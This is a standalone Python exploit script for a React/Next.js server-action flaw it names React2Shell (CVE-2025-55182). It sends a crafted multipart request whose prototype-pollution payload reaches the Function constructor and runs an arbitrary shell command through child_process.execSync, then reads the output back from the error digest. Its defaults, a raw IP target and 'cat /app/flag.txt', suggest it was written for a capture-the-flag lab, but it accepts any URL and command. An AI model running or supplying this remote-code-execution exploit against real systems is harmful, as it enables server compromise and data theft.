#!/usr/bin/env python3
"""Exploit React2Shell (CVE-2025-55182) and print command output."""

import json
import re
import sys
import urllib.request
import uuid


def multipart(fields, boundary):
    chunks = []
    for name, value in fields.items():
        chunks.append(
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="{name}"\r\n\r\n'
            f"{value}\r\n"
        )
    chunks.append(f"--{boundary}--\r\n")
    return "".join(chunks).encode()


def exploit(url, command):
    # $B1337 ultimately calls Function(_prefix + "1337").  The trailing
    # comment keeps that appended blob identifier out of the JS program.
    javascript = (
        "var r=process.mainModule.require('child_process')"
        f".execSync({json.dumps(command)}).toString().trim();"
        "throw Object.assign(new Error('NEXT_REDIRECT'),{digest:r});//"
    )
    payload = {
        "then": "$1:__proto__:then",
        "status": "resolved_model",
        "reason": -1,
        "value": '{"then":"$B1337"}',
        "_response": {
            "_prefix": javascript,
            "_chunks": "$Q2",
            "_formData": {"get": "$1:constructor:constructor"},
        },
    }
    boundary = "----ReactOOPS" + uuid.uuid4().hex
    body = multipart({"0": json.dumps(payload), "1": '"$@0"', "2": "[]"}, boundary)
    request = urllib.request.Request(
        url,
        data=body,
        method="POST",
        headers={
            "Content-Type": f"multipart/form-data; boundary={boundary}",
            "Next-Action": "x",
        },
    )
    try:
        with urllib.request.urlopen(request, timeout=15) as response:
            result = response.read().decode(errors="replace")
    except urllib.error.HTTPError as error:
        result = error.read().decode(errors="replace")

    match = re.search(r'"digest"\s*:\s*("(?:\\.|[^"\\])*")', result)
    if not match:
        raise RuntimeError(f"command output not found in response:\n{result[:2000]}")
    return json.loads(match.group(1))


if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "http://154.57.164.67:32233/"
    command = sys.argv[2] if len(sys.argv) > 2 else "cat /app/flag.txt"
    print(exploit(target, command))
